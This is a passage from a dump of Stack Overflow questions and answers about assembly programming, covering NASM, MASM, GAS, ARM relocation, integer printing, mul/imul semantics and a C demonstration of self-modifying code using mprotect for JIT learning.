<p>Thanks</p>
","<pre><code>section .bss

variable: resb 4
</code></pre>

<p>... the symbol <code>variable</code> now refers to the address of 4 bytes of storage in the <code>.bss</code> section (i.e. enough to store a 32-bit value in).</p>

<pre><code>section .text
...
mov eax, 123
mov [variable], eax
</code></pre>

<p>... sets the <code>eax</code> register to <code>123</code>, and then stores the value of <code>eax</code> in the location addressed by the symbol <code>variable</code>.</p>

<pre><code>mov eax, [variable]
</code></pre>

<p>... reads the value currently stored in the location addressed by <code>variable</code> into the <code>eax</code> register.</p>

<pre><code>mov eax, 456
mov [variable], eax
</code></pre>

<p>... stores a new value, overwriting the previous one.</p>
","8145374"
"Outputting Hello World in MASM using WIN32 Functions","15753","","<p><strong>Contents</strong></p>

<ol>
<li>Intro</li>
<li>Code</li>
<li>Assembling and Running</li>
<li>Miscellaneous </li>
<li>Question</li>
</ol>

<p><strong>1. Intro</strong></p>

<p>This isn't a question per se (though there is one at the bottom) but a HelloWorld app for people on StackOverflow to experiment with. </p>

<p>When I was first trying programing in MASM I tried to find a working HelloWorld application that used the WIN32 API calls (so not linking to C libraries) but couldn't find one (in MASM Syntax). So now that I have some experience I have written one for others wanting to learn assembly to fiddle with.</p>

<p><strong>2. Code</strong></p>

<pre><code>.386 ; 386 Processor Instruction Set

.model flat,stdcall ; Flat memory model and stdcall method

option casemap:none ; Case Sensitive

;Libaries and Include files used in this project

; Windows.inc defines alias (such as NULL and STD_OUTPUT_HANDLE in this code
include \masm32\include\windows.inc 

; Functions that we use (GetStdHandle, WriteConsole, and ExitProcess)
; Listing of all available functions in kernel32.lib
include \masm32\include\kernel32.inc 
; Actuall byte code available of the functions
includelib \masm32\lib\kernel32.lib  

.data
; Labels that with the allocated data (in this case Hello World!...) that are aliases to memory.
output db ""Hello World!"", 0ah, 0h; This String Hello World! and then a the newline character \n (0ah) and then the null character 0h

.code 
start: 

; --------------------------------------------------------------------------------------------------------------------------------------
; Retrieves that handle to the output console
;
; ====Arguments===
;
; STD_OUTPUT_HANDLE - alias for -11 and indicates that we want the handle to 
;                     write to console output
;
invoke GetStdHandle, STD_OUTPUT_HANDLE
; --------------------------------------------------------------------------------------------------------------------------------------

; --------------------------------------------------------------------------------------------------------------------------------------
; Writes the text in output (.data section) to the console
;
; ====Arguments===
;
; eax - the handle to the console buffer
;
; addr output - pass by reference the text of output (Hello World!)
;
; sizeof output - the size of the string so that the WriteConsole knows when to 
;                 stop (doesn't support NULL terminated strings I guess);
;
; ebx - secondary ""return"" value that contains the number of bytes written (eax
;       is used for an error code)
;
; NULL - this is reserved and MSDN says just to pass NULL
;
; MSDN Link: http://msdn.microsoft.com/en-us/library/ms687401(v=VS.85).aspx
;
invoke WriteConsole, eax, addr output, sizeof output, ebx, NULL
; --------------------------------------------------------------------------------------------------------------------------------------

; --------------------------------------------------------------------------------------------------------------------------------------
; Exits the program with return code 0 (default one that usually is used to 
; indicate that the program did not error
;
; ====Arguments===
;
; 0 - the exit code
;
; MSDN Link: http://msdn.microsoft.com/en-us/library/ms682658(VS.85).aspx
;
invoke ExitProcess, 0
; --------------------------------------------------------------------------------------------------------------------------------------

end start 
</code></pre>

<p><strong>3. Assembling and Running</strong></p>

<p>I assume you have MASM32 installed in your C:\MASM32 directory. </p>

<ul>
<li><p>If you do not have MASM installed
please go to
<a href=""http://masm32.com/install.htm"" rel=""nofollow noreferrer"">http://masm32.com/install.htm</a>
and follow the instructions.</p></li>
<li><p>If MASM32 is installed in a different
directory please change the
instructions accordingly.</p>

<ol>
<li><p>Open up the MASM32 Editor (QEditor) by either clicking on the Desktop Shortcut or if there is no shortcut go to C:\MASM32\ and double click qeditor.exe</p></li>
<li><p>Copy the code in the code section (only the text that has a gray background) and paste it into the MASM32 Editor (QEditor) and save it.</p></li>
<li><p>After saving the code click the Project menu and select Console Assemble and Link (<strong><em>NOT</em></strong> Assemble and Link (see Miscellaneous))</p></li>
<li><p>Go to START and click Run, then type cmd and hit ENTER a black box with gray text should appear</p></li>
<li><p>Navigate, using Explorer, to where you saved the code in step 3. There should now be a file with the same name as your source file (step 3) but be an exe. Drag and drop the exe file from the Explorer window to the cmd box (step 4 the black box)</p></li>
<li><p>Select the black box and hit ENTER, the text ""Hello World!"" should appear.</p></li>
</ol></li>
</ul>

<p><strong>4. Miscellaneous</strong></p>

<p><strong>Why do I have to click Console Assemble and Run and not just Assemble and Run in the Project Menu?</strong></p>

<p>The reason you have to click Console Assemble and Run is because there are two types of applications, there are GUIs and then there are text base console (DOS) applications. The Hello Would Application is a text based one and so when assembled must be have the settings a console based app would and not a GUI.</p>

<p>See the third paragraph under Remarks in <a href=""http://msdn.microsoft.com/en-us/library/ms681944(v=vs.85).aspx"" rel=""nofollow noreferrer"">this link</a> for a more detailed explanation.</p>

<p><strong>5. Question</strong></p>

<p>Ok now the question, does anyone here see any problems, errors, or general issues with this code or have any suggestions</p>
","<p>The program is fine. It is indeed ""Hello World"" version of Win32. However, remember its a console program. In Win32, you will be mostly dealing with Windows, Dialog Boxes and very less with Console (Incase, you want to deal specifically with console, thats another story).</p>

<p>If you want to lean Win32 Assembly, I strongly suggest you to look at Iczelion Tutorials.</p>

<p>Here is the ""Hello World"" to start with his tutorials:</p>

<p><a href=""https://web.archive.org/web/20120709024212/http://win32assembly.online.fr/tut2.html"" rel=""nofollow"">http://win32assembly.online.fr/tut2.html</a></p>
","4568404"
"problem in understanding mul & imul instructions of Assembly language","15642","","<p>I'm learning 80386 from <a href=""http://drpaulcarter.com/pcasm/"" rel=""noreferrer"">PC Assembly by paul caurter</a></p>

<pre><code>  mul source
</code></pre>

<blockquote>
  <ul>
  <li>If the operand is byte sized, it is multiplied by the byte in the AL
  register and the <strong>result is stored in
  the 16 bits of AX</strong>. </li>
  </ul>
</blockquote>

<p>fine.</p>

<blockquote>
  <ul>
  <li>If the source is 16-bit, it is multiplied by the word in AX and the
  32-bit result is stored in DX:AX.</li>
  </ul>
</blockquote>

<p><strong>Q1:</strong> Why DX:AX ? Why can't it store in EAX / EDX?</p>

<p><code>imul</code> is really confusing</p>

<pre><code>imul dest, source1
imul dest, source1, source2
</code></pre>

<p><a href=""http://img697.imageshack.us/img697/8976/imul.gif"" rel=""noreferrer"">alt text http://img697.imageshack.us/img697/8976/imul.gif</a></p>

<p>I've problem in understanding the table. </p>

<p><strong>Q2:</strong> in the 2nd entry of the table. Again, why DX:AX. Why not EAX or EDX?</p>

<p>Now consider following code snippet:</p>

<pre><code>imul eax ; edx:eax = eax * eax
mov ebx, eax ; save answer in ebx
mov eax, square_msg ; square_msg db ""Square of input is "", 0
call print_string ; prints the string eax
mov eax, ebx 
call print_int ;  prints the int stored in eax
call print_nl ; prints new line
</code></pre>

<p><strong>Q3:</strong> Its previsously said that <code>The notation EDX:EAX means to think of the EDX and EAX registers as one 64 bit register with the upper
32 bits in EDX and the lower bits in EAX.</code> So the answer is also stored in edx, right? in the above code we didn't consider any EDX we are just referring to EAX
How is this still working?</p>

<p><strong>Q4:</strong> I've problem with rest of all entries in the table. worst case multiplication result of two n bit numbers(n = 8/16/32 bits) is 2n bits. How come its storing the result of two 16/32 bit multiplication result in register of same size itself?</p>
","<p>Q1/Q2: The x86 instruction set maintains its 16-bit history. When doing a 16-bit multiply, the answer is stored in DX:AX. That's just the way it is, because that's how it was in 16-bit land.</p>

<p>Q3: The code you showed has a bug if you try to compute the square of a number larger than 2^16, because the code ignores the high 32 bits of the result stored in <code>edx</code>.</p>

<p>Q4: I think you may be misreading the table. 8-bit multiplications are stored in a 16-bit result; 16-bit multiplications are stored in a 32-bit result; 32-bit multiplications are stored in a 64-bit result. Which line are you referring to specifically?</p>
","1948086"
"In x86 assembly how can you set the zero flag (ZF) without doing a compare operation?","15628","","<p>I have a short piece of (x86) assembly that I am trying to figure out what it does.</p>

<pre><code>...
 6:     81 ec 00 01 00 00       sub    $0x100, %esp
 c:     31 c9                   xor    %ecx  , %ecx
 e:     88 0c 0c                mov    %cl   , (%esp, %ecx, 1)
11:     fe c1                   inc    %cl
13:     75 f9                   jne    0xe
....
</code></pre>

<p>It looks like its looping though until the ""JNE"" evaluates to false, i.e. the zero flag = 0.  (possibly its putting the numbers 1, 2, 3 ... into the stack??)</p>

<p>From my short investigation into assembly (im new at this) it seam you set the zero flag by doing a compare operation (CMP), but I dont see a compare operation. </p>

<p>So, under what conditions will it break out of this loop?</p>
","<p><code>inc</code> sets ZF if the value of <code>cl</code> after the increment is zero.  Your loop is doing this:</p>

<pre><code>sub    $0x100, %esp            // unsigned char array[256];
xor    %ecx  , %ecx            // unsigned char cl = 0;
mov    %cl   , (%esp, %ecx, 1) // e: array[cl] = cl;
inc    %cl                     //    cl += 1;
jne    0xe                     //    if (cl != 0) goto e;
</code></pre>

<p>The loop terminates when <code>cl</code> is incremented from 255 and wraps around to 0, setting ZF.</p>
","8403756"
"How to install and use GAS (GNU Compiler) on Linux?","15550","","<p>I'm using Ubuntu, and I was looking for an assembler compiler for linux, and I foung GAS. I'm trying to install it and run it,  but I can't. Can someone help me? Like a tutorial of how to do it? Thanks.</p>
","<p><code>as</code> is the <a href=""http://en.wikipedia.org/wiki/GNU_Assembler"" rel=""noreferrer"">GNU Assembler</a>. It's found in <code>binutils</code> but if you do:</p>

<p><code>sudo apt-get install build-essential</code></p>

<p>You will get <code>gas</code> along with <code>gcc</code> (which default uses <code>gas</code> for assembling on the back end).</p>

<p>For a 'tutorial' about using <code>gas</code>, you probably want to read <a href=""http://download.savannah.gnu.org/releases/pgubook/"" rel=""noreferrer"">Programming From the Ground Up</a>, which uses it.</p>
","4252035"
"What is Relocatable and Absolute Machine Code?","15550","","<p>While studying Assemblers, I came across these terms.The idea I got is like this, in Relocatable machine code, the code is not dependent on static RAM location. The assembler specifies RAM needs for my program. The memory can be placed wherever the linker finds room for them.</p>

<p>Is the idea correct? If so, how is it done by the assembler?</p>

<p>And, what are some examples of Absolute Machine Code?</p>
","<p>Many/most instruction sets have pc relative addressing, meaning take the address of the program counter, which is related to the address of the instruction you are executing, and then add an offset to that and use that for accessing memory or branching or something like that.  that would be what you are calling relocatable.  Because no matter where that instruction is in the address space the thing you want to jump to is relative.  Move the whole block of code and data to some other address and they will still be relatively the same distance apart, so the relative addressing will still work.  If equal skip the next instruction works wherever those three instructions are (the if skip, the one being skipped and the one after the skip).</p>

<p>Absolute uses absolute addresses, jump to this exact address, read from this exact address.  If equal then branch to 0x1000.</p>

<p>The assembler doesnt do this the compiler and or programmer does.  Generally, eventually, compiled code will end up having absolute addressing, in particular if your code consists of separate objects that are linked together.  At compile time the compiler cant know where the object will end up nor is it possible to know where the external references are or how far away so it cant generally assume they will be close enough for pc relative addressing (which generally has a range limit).  So the compilers often generate a placeholder for the linker to fill in with an absolute address.  It does depend on the operation and instruction set and some other factors as to how this external address problem is solved.  Eventually though based on project size, the linker will end up with some absolute addressing.  So the non-default is usually a command line option to generate position independent code -PIC for example might be something your compiler supports.  both the compiler and linker then have to do extra work to make those items position independent.  An assembly language programmer has to do this all themselves, the assembler generally doesnt get involved in this it just creates the machine code for the instructions you tell it to generate.</p>

<p>novectors.s:</p>

<pre><code>.globl _start
_start:
    b   reset
reset:
    mov sp,#0xD8000000
    bl notmain
    ldr r0,=notmain
    blx r0
hang: b hang

.globl dummy
dummy:
    bx lr
</code></pre>

<p>hello.c</p>

<pre><code>extern void dummy ( unsigned int );
int notmain ( void )
{
    unsigned int ra;
    for(ra=0;ra&lt;1000;ra++) dummy(ra);
    return(0);
}
</code></pre>

<p>memap (the linker script)
    MEMORY
    {
        ram : ORIGIN = 0xD6000000, LENGTH = 0x4000
    }
    SECTIONS
    {
        .text : { <em>(.text</em>) } > ram
    }
Makefile</p>

<pre><code>ARMGNU = arm-none-eabi
COPS = -Wall -O2 -nostdlib -nostartfiles -ffreestanding 
all : hello_world.bin
clean :
    rm -f *.o
    rm -f *.bin
    rm -f *.elf
    rm -f *.list

novectors.o : novectors.s
    $(ARMGNU)-as novectors.s -o novectors.o

hello.o : hello.c
    $(ARMGNU)-gcc $(COPS) -c hello.c -o hello.o

hello_world.bin : memmap novectors.o hello.o 
    $(ARMGNU)-ld novectors.o hello.o -T memmap -o hello_world.elf
    $(ARMGNU)-objdump -D hello_world.elf &gt; hello_world.list
    $(ARMGNU)-objcopy hello_world.elf -O binary hello_world.bin 
</code></pre>

<p>hello_world.list (the parts we care about)</p>

<pre><code>Disassembly of section .text:

d6000000 &lt;_start&gt;:
d6000000:   eaffffff    b   d6000004 &lt;reset&gt;

d6000004 &lt;reset&gt;:
d6000004:   e3a0d336    mov sp, #-671088640 ; 0xd8000000
d6000008:   eb000004    bl  d6000020 &lt;notmain&gt;
d600000c:   e59f0008    ldr r0, [pc, #8]    ; d600001c &lt;dummy+0x4&gt;
d6000010:   e12fff30    blx r0

d6000014 &lt;hang&gt;:
d6000014:   eafffffe    b   d6000014 &lt;hang&gt;

d6000018 &lt;dummy&gt;:
d6000018:   e12fff1e    bx  lr
d600001c:   d6000020    strle   r0, [r0], -r0, lsr #32

d6000020 &lt;notmain&gt;:
d6000020:   e92d4010    push    {r4, lr}
d6000024:   e3a04000    mov r4, #0
d6000028:   e1a00004    mov r0, r4
d600002c:   e2844001    add r4, r4, #1
d6000030:   ebfffff8    bl  d6000018 &lt;dummy&gt;
d6000034:   e3540ffa    cmp r4, #1000   ; 0x3e8
d6000038:   1afffffa    bne d6000028 &lt;notmain+0x8&gt;
d600003c:   e3a00000    mov r0, #0
d6000040:   e8bd4010    pop {r4, lr}
d6000044:   e12fff1e    bx  lr
</code></pre>

<p>What I am showing here is a mixture of position independent instructions and position dependent instructions.</p>

<p>these two instructions for example are a shortcut to force the assembler to add a .word style memory location that the linker then has to fill in for us.</p>

<pre><code>ldr r0,=notmain
blx r0
</code></pre>

<p>0xD600001c is that location.</p>

<pre><code>    d600000c:   e59f0008    ldr r0, [pc, #8]    ; d600001c &lt;dummy+0x4&gt;
    d6000010:   e12fff30    blx r0
...
    d600001c:   d6000020    strle   r0, [r0], -r0, lsr #32
</code></pre>

<p>and it is filled in with the address 0xD6000020 which is an absolute address so for that code to work the function notmain must be at address 0xD6000020 it is not relocatable.  but this portion of the example also demonstrates some position independent code as well, the</p>

<pre><code>ldr r0, [pc, #8]
</code></pre>

<p>is the pc relative addressing I was talking about the way this instruction set works is at the time of execution the pc is two instructions ahead or basically in this case if the instruction is at 0xD600000c in memory then the pc will be 0xD6000014 when executing then add 8 to that as the instruction states and you get 0xD600001C.  But if we moved that exact same machine code instruction to address 0x1000 <em>AND</em> we move all of the surrounding binary there including the thing it is reading (the 0xD6000020).  basically do this:</p>

<pre><code>    1000:   e59f0008    ldr r0, [pc, #8]    
    1004:   e12fff30    blx r0
...
    1010:   d6000020    
</code></pre>

<p>And those instructions, that machine code will still work, it doesnt have to be re-assembled or re-linked.  the 0xD6000020 code sitll hast to be at that fixed address bit the ldr pc and blx dont.</p>

<p>Although the disassembler shows these with 0xd6... based addresses the bl and bne are also pc relative which you can find out by looking at the instruction set documentation</p>

<pre><code>d6000030:   ebfffff8    bl  d6000018 &lt;dummy&gt;
d6000034:   e3540ffa    cmp r4, #1000   ; 0x3e8
d6000038:   1afffffa    bne d6000028 &lt;notmain+0x8&gt;
</code></pre>

<p>0xD6000030 would have a pc of 0xD6000038 when executed and 0xD6000038-0xD6000018 = 0x20 which is 8 instructions.  And a negative 8 in twos complement is 0xFFF..FFFF8, you can see the bulk of that machine code ebfffff8 is ffff8, which is what is sign extended and added to the program counter to basically say branch backward 8 instrucitons.  Same goes for the ffffa in 1afffffa it means if not equal then branch backward 6 instructions.  Remember this instruction set (arm) assumes the pc is two instructions ahead so that back 6 means forward two then back 6 or effectively back 4.</p>

<p>If you remove the </p>

<pre><code>d600000c:   e59f0008    ldr r0, [pc, #8]    ; d600001c &lt;dummy+0x4&gt;
d6000010:   e12fff30    blx r0
</code></pre>

<p>Then this entire program ends up being position independent, by accident if you will (I happened to have known it would happen) but not because I told the tools to do that but simply because I made everything close and didnt use any absolute addressing.</p>

<p>lastly when you say ""wherever the linker finds room for them""  if you notice in my linker script I tell the linker to put everything starting at 0xD6000000, I didnt specify any file names or functions, so if not told otherwise this linker places the items in the order they are specified on the command line.  the hello.c code is second so after the linker has placed the novectors.s code, then the wherever the linker had room is right after that, the hello.c code starts at 0xD6000020.  </p>

<p>And an easy way to see what is position independent and what isnt without having to research each instruction would be to change the linker script to put the code at some other address.</p>

<pre><code>MEMORY
{
    ram : ORIGIN = 0x1000, LENGTH = 0x4000
}
SECTIONS
{
    .text : { *(.text*) } &gt; ram
}
</code></pre>

<p>and see what machine code changes if any, and what doesnt.</p>

<pre><code>00001000 &lt;_start&gt;:
    1000:   eaffffff    b   1004 &lt;reset&gt;

00001004 &lt;reset&gt;:
    1004:   e3a0d336    mov sp, #-671088640 ; 0xd8000000
    1008:   eb000004    bl  1020 &lt;notmain&gt;
    100c:   e59f0008    ldr r0, [pc, #8]    ; 101c &lt;dummy+0x4&gt;
    1010:   e12fff30    blx r0

00001014 &lt;hang&gt;:
    1014:   eafffffe    b   1014 &lt;hang&gt;

00001018 &lt;dummy&gt;:
    1018:   e12fff1e    bx  lr
    101c:   00001020    andeq   r1, r0, r0, lsr #32

00001020 &lt;notmain&gt;:
    1020:   e92d4010    push    {r4, lr}
    1024:   e3a04000    mov r4, #0
    1028:   e1a00004    mov r0, r4
    102c:   e2844001    add r4, r4, #1
    1030:   ebfffff8    bl  1018 &lt;dummy&gt;
    1034:   e3540ffa    cmp r4, #1000   ; 0x3e8
    1038:   1afffffa    bne 1028 &lt;notmain+0x8&gt;
    103c:   e3a00000    mov r0, #0
    1040:   e8bd4010    pop {r4, lr}
    1044:   e12fff1e    bx  lr
</code></pre>
","22890413"
"How to write self-modifying code in x86 assembly","15526","","<p>I'm looking at writing a JIT compiler for a hobby virtual machine I've been working on recently. I know a bit of assembly, (I'm mainly a C programmer. I can read most assembly with  reference for opcodes I don't understand, and write some simple programs.) but I'm having a hard time understanding the few examples of self-modifying code I've found online.</p>

<p>This is one such example: <a href=""http://asm.sourceforge.net/articles/smc.html"" rel=""noreferrer"">http://asm.sourceforge.net/articles/smc.html</a></p>

<p>The example program provided does about four different modifications when run, none of which are clearly explained. Linux kernel interrupts are used several times, and aren't explained or detailed. (The author moved data into several registers before calling the interrupts. I assume he was passing arguments, but these arguments aren't explained at all, leaving the reader to guess.)</p>

<p>What I'm looking for is the simplest, most straightforward example in code of a self-modifying program. Something that I can look at, and use to understand how self-modifying code in x86 assembly has to be written, and how it works. Are there any resources you can point me to, or any examples you can give that would adequately demonstrate this?</p>

<p>I'm using NASM as my assembler.</p>

<p>EDIT: I'm also running this code on Linux.</p>
","<p>wow, this turned out to be a lot more painful than I expected.  100% of the pain was linux protecting the program from being overwritten and/or executing data.</p>

<p>Two solutions shown below.  And a lot of googling was involved so the somewhat simple put some instruction bytes and execute them was mine, the mprotect and aligning on page size was culled from google searches, stuff I had to learn for this example.</p>

<p>The self modifying code is straight forward, if you take the program or at least just the two simple functions, compile and then disassemble you will get the opcodes for those instructions. or use nasm to compile blocks of assembler, etc.  From this I determined the opcode to load an immediate into eax then return.</p>

<p>Ideally you simply put those bytes in some ram and execute that ram.  To get linux to do that you have to change the protection, which means you have to send it a pointer that is aligned on a mmap page.  So allocate more than you need, find the aligned address within that allocation that is on a page boundary and mprotect from that address and use that memory to put your opcodes and then execute.</p>

<p>the second example takes an existing function compiled into the program, again because of the protection mechanism you cannot simply point at it and change bytes, you have to unprotect it from writes.  So you have to back up to the prior page boundary call mprotect with that address and enough bytes to cover the code to be modified.  Then you can change the bytes/opcodes for that function in any way you want (so long as you don't spill over into any function you want to continue to use) and execute it.  In this case you can see that <code>fun()</code> works, then I change it to simply return a value, call it again and now it has been modified.</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/mman.h&gt;

unsigned char *testfun;

unsigned int fun ( unsigned int a )
{
    return(a+13);
}

unsigned int fun2 ( void )
{
    return(13);
}

int main ( void )
{
    unsigned int ra;
    unsigned int pagesize;
    unsigned char *ptr;
    unsigned int offset;

    pagesize=getpagesize();
    testfun=malloc(1023+pagesize+1);
    if(testfun==NULL) return(1);
    //need to align the address on a page boundary
    printf(""%p\n"",testfun);
    testfun = (unsigned char *)(((long)testfun + pagesize-1) &amp; ~(pagesize-1));
    printf(""%p\n"",testfun);

    if(mprotect(testfun, 1024, PROT_READ|PROT_EXEC|PROT_WRITE))
    {
        printf(""mprotect failed\n"");
        return(1);
    }

    //400687: b8 0d 00 00 00          mov    $0xd,%eax
    //40068d: c3                      retq

    testfun[ 0]=0xb8;
    testfun[ 1]=0x0d;
    testfun[ 2]=0x00;
    testfun[ 3]=0x00;
    testfun[ 4]=0x00;
    testfun[ 5]=0xc3;

    ra=((unsigned int (*)())testfun)();
    printf(""0x%02X\n"",ra);


    testfun[ 0]=0xb8;
    testfun[ 1]=0x20;
    testfun[ 2]=0x00;
    testfun[ 3]=0x00;
    testfun[ 4]=0x00;
    testfun[ 5]=0xc3;

    ra=((unsigned int (*)())testfun)();
    printf(""0x%02X\n"",ra);


    printf(""%p\n"",fun);
    offset=(unsigned int)(((long)fun)&amp;(pagesize-1));
    ptr=(unsigned char *)((long)fun&amp;(~(pagesize-1)));


    printf(""%p 0x%X\n"",ptr,offset);

    if(mprotect(ptr, pagesize, PROT_READ|PROT_EXEC|PROT_WRITE))
    {
        printf(""mprotect failed\n"");
        return(1);
    }

    //for(ra=0;ra&amp;lt;20;ra++) printf(""0x%02X,"",ptr[offset+ra]); printf(""\n"");

    ra=4;
    ra=fun(ra);
    printf(""0x%02X\n"",ra);

    ptr[offset+0]=0xb8;
    ptr[offset+1]=0x22;
    ptr[offset+2]=0x00;
    ptr[offset+3]=0x00;
    ptr[offset+4]=0x00;
    ptr[offset+5]=0xc3;

    ra=4;
    ra=fun(ra);
    printf(""0x%02X\n"",ra);

    return(0);
}
</code></pre>
","4819124"
"Printing a character to standard output in Assembly x86","15475","","<p>I'm a little confused about how to print a character to the screen using Assembly. The architecture is x86 (linux). Is it possible to call one of the C functions or is there a simpler way? The character I want to output is stored in a register.</p>

<p>Thanks!</p>
","<p>Sure, you can use any normal C function. Here's a NASM example that uses <a href=""http://linux.die.net/man/3/printf"">printf</a> to print some output:</p>

<pre><code>;
; assemble and link with:
; nasm -f elf test.asm &amp;&amp; gcc -m32 -o test test.o
;
section .text

extern printf   ; If you need other functions, list them in a similar way

global main

main:

    mov eax, 0x21  ; The '!' character
    push eax
    push message
    call printf
    add esp, 8     ; Restore stack - 4 bytes for eax, and 4 bytes for 'message'
    ret

message db 'The character is: %c', 10, 0
</code></pre>

<p>If you only want to print a single character, you could use <a href=""http://linux.die.net/man/3/putchar"">putchar</a>:</p>

<pre><code>push eax
call putchar
</code></pre>

<hr>

<p>If you want to print out a number, you could do it like this:</p>

<pre><code>mov ebx, 8
push ebx
push message
call printf
...    
message db 'The number is: %d', 10, 0
</code></pre>
","8201694"
"Printing an Int (or Int to String)","15437","","<p>I am looking for a way to print an integer in assembler (the compiler I am using is NASM on Linux), however, after doing some research, I have not been able to find a truly viable solution. I was able to find a description for a basic algorithm to serve this purpose, and based on that I developed this code:</p>

<pre><code>global _start

section .bss
digit: resb 16
count: resb 16
i: resb 16

section .data

section .text

_start:
mov             dword[i], 108eh         ; i = 4238
mov             dword[count], 1
L01:
mov             eax, dword[i]
cdq
mov             ecx, 0Ah
div             ecx  
mov             dword[digit], edx

add             dword[digit], 30h       ; add 48 to digit to make it an ASCII char
call            write_digit

inc             dword[count]

mov             eax, dword[i]
cdq
mov             ecx, 0Ah
div             ecx  
mov             dword[i], eax 
cmp             dword[i], 0Ah  
jg              L01

add             dword[i], 48            ; add 48 to i to make it an ASCII char
mov             eax, 4                  ; system call #4 = sys_write
mov             ebx, 1                  ; file descriptor 1 = stdout
mov             ecx, i                  ; store *address* of i into ecx
mov             edx, 16                 ; byte size of 16
int             80h

jmp             exit

exit:
mov             eax, 01h                ; exit()
xor             ebx, ebx                ; errno
int             80h

write_digit:
mov             eax, 4                  ; system call #4 = sys_write
mov             ebx, 1                  ; file descriptor 1 = stdout
mov             ecx, digit              ; store *address* of digit into ecx
mov             edx, 16                 ; byte size of 16
int             80h
ret
</code></pre>

<p>C# version of what I want to achieve (for clarity):</p>

<pre><code>static string int2string(int i)
{
    Stack&lt;char&gt; stack = new Stack&lt;char&gt;();
    string s = """";

    do
    {
        stack.Push((char)((i % 10) + 48));
        i = i / 10;
    } while (i &gt; 10);

    stack.Push((char)(i + 48));

    foreach (char c in stack)
    {
        s += c;
    }

    return s;
}
</code></pre>

<p>The issue is that it outputs the characters in reverse, so for <code>4238</code>, the output is <code>8324</code>. At first, I thought that I could use the x86 stack to solve this problem, push the digits in, and pop them out and print them at the end, however when I tried implementing that feature, it flopped and I could no longer get an output. </p>

<p>As a result, I am a little bit perplexed about how I can implement a stack in to this algorithm in order to accomplish my goal, aka printing an integer. I would also be interested in a simpler/better solution if one is available (as it's one of my first assembler programs).</p>
","<p>One approach is to use recursion. In this case you divide the number by 10 (getting a quotient and a remainder) and then call yourself with the quotient as the number to display; and then display the digit corresponding to the remainder.</p>

<p>An example of this would be:</p>

<pre><code>;Input
; eax = number to display

    section .data
const10:    dd 10
    section .text

printNumber:
    push eax
    push edx
    xor edx,edx          ;edx:eax = number
    div dword [const10]  ;eax = quotient, edx = remainder
    test eax,eax         ;Is quotient zero?
    je .l1               ; yes, don't display it
    call printNumber     ;Display the quotient
.l1:
    lea eax,[edx+'0']
    call printCharacter  ;Display the remainder
    pop edx
    pop eax
    ret
</code></pre>

<p>Another approach is to avoid recursion by changing the divisor. An example of this would be:</p>

<pre><code>;Input
; eax = number to display

    section .data
divisorTable:
    dd 1000000000
    dd 100000000
    dd 10000000
    dd 1000000
    dd 100000
    dd 10000
    dd 1000
    dd 100
    dd 10
    dd 1
    dd 0
    section .text

printNumber:
    push eax
    push ebx
    push edx
    mov ebx,divisorTable
.nextDigit:
    xor edx,edx          ;edx:eax = number
    div dword [ebx]      ;eax = quotient, edx = remainder
    add eax,'0'
    call printCharacter  ;Display the quotient
    mov eax,edx          ;eax = remainder
    add ebx,4            ;ebx = address of next divisor
    cmp dword [ebx],0    ;Have all divisors been done?
    jne .nextDigit
    pop edx
    pop ebx
    pop eax
    ret
</code></pre>

<p>This example doesn't suppress leading zeros, but that would be easy to add.</p>
","13523734"
"Passing parameters and return values for a subroutine in assembly","15429","","<p>I am working with ARM assembly, where I have to write one subroutine for which I am following the ARM calling convention(this will have to be integrated with some separate higher level implementation somewhere else ) for passing parameters and return values. Now here is something I am not sure in general when working with assembly.</p>

<p>So from the convention if I understand well the arguments are passed in order starting from registers r0 - r4 and then for other arguments stacks are used. Return values are passed to r0. </p>

<p>Now here is what I am confused with. If I am supposed to save the context of r0 and pop it off after then there is no way to return the result, the only way it can be done is by corrupting the first argument. Is there a workaround somehow?
Thanks in advance guys!</p>
","<p>When you pass back the return value in r0, the caller <em>expects</em> that you will do this. The caller does not expect that r0 will still contain the same value as the original first parameter, because r0 is specifically where the return value is.</p>

<p>Normally the <a href=""https://en.wikipedia.org/wiki/Calling_convention#ARM"">ARM calling convention requires that the subroutine preserves r4 through r11</a>, not r0 through r3. So there is no contradiction anyway.</p>
","12486930"
"Reverse a byte using assembly language","15411","","<p>I'm in a microprocessors class and we are using assembly language in Freescale CodeWarrior to program a 68HCS12 micro controller. Our assignment this week is to revers a byte, so if the byte was 00000001, the output would be 10000000, or 00101011 to 11010100. We have to use assembly language, and were told we could use rotates and shifts (but not limited to!) to accomplish this task. I'm really at a loss as to where I should start.</p>
","<p>If you can spare the 256 bytes extra code size, a lookup table is probably the most efficient way to reverse a byte on a 68HCS12. But I am pretty sure this is not what your instructor is expecting.</p>

<p>For the ""normal"" solution, consider the data bits individually. Rotates and shifts allow you to move bits around. For a first solution, isolate the eight bits (with bitwise ""and"" operations), move them to their destination positions (shifts, rotates...), then combine them together again (with bitwise ""or"" operations). This will not be the most efficient or simplest implementation, but you should first concentrate on getting a correct result -- optimization can wait.</p>
","4924295"
"Fastest way to do horizontal float vector sum on x86","15403","","<p>You have a vector of three (or four) floats. What is the fastest way to sum them?</p>

<p>Is SSE (movaps, shuffle, add, movd) always faster than x87? Are the horizontal-add instructions in SSE4.2 worth it? What's the cost to moving to the FPU, then faddp, faddp? What's the fastest specific instruction sequence?</p>

<p>""Try to arrange things so you can sum four vectors at a time"" will not be accepted as an answer. :-)</p>
","<p>Here are some versions tuned based on <a href=""http://agner.org/optimize/"" rel=""noreferrer"">Agner Fog's microarch guide</a>'s microarch guide and instruction tables.  See also the <a href=""/questions/tagged/x86"" class=""post-tag"" title=""show questions tagged &#39;x86&#39;"" rel=""tag"">x86</a> tag wiki.  They should be efficient on any CPU, with no major bottlenecks.  (e.g. I avoided things that would help one uarch a bit but be slow on another uarch).  Code-size is also minimized.</p>

<p>The common 2x <code>hadd</code> idiom is only good for code-size, not speed on any existing CPUs.  There are use-cases for it (see below), but this isn't one of them.</p>

<p>I've also included an AVX version.  Any kind of horizontal reduction with  AVX / AVX2 should start with a <code>vextractf128</code> and a ""vertical"" operation to reduce down to one XMM (<code>__m128</code>) vector.</p>

